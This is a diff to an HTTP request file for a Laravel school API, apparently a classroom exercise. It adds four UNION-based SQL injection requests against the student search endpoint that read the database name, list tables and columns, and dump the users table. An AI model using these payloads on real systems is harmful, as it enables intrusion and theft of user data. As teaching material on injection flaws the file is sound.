@@ -6,6 +6,28 @@
 
 
 # ------------  lekérdezések ---------
+
+# sql injection
+### get mi az adatbázis neve
+get {{host}}/api/queryDiakKeres/Feri" union select database(), '', '', '', '', '', '', '', '', ''%23"
+Accept: application/json
+ 
+### get milyen tábáink vannak
+get {{host}}/api/queryDiakKeres/Feri" union SELECT table_name, '', '', '', '', '', '', '', '', '' from information_schema.tables WHERE table_schema = 'laravel-iskola'%23"
+Accept: application/json
+ 
+ 
+### get a user tábla oszlopai
+get {{host}}/api/queryDiakKeres/Feri" union SELECT column_name, '', '', '', '', '', '', '', '', '' from information_schema.columns WHERE  table_name='users' AND  table_schema = 'laravel-iskola'%23"
+Accept: application/json
+ 
+ 
+### get user adatok
+get {{host}}/api/queryDiakKeres/Feri" union select *, '', '' from users %23"
+Accept: application/json
+ 
+
+
 ### get users
 get {{host}}/api/queryOsztalynevsor
 Accept: application/json
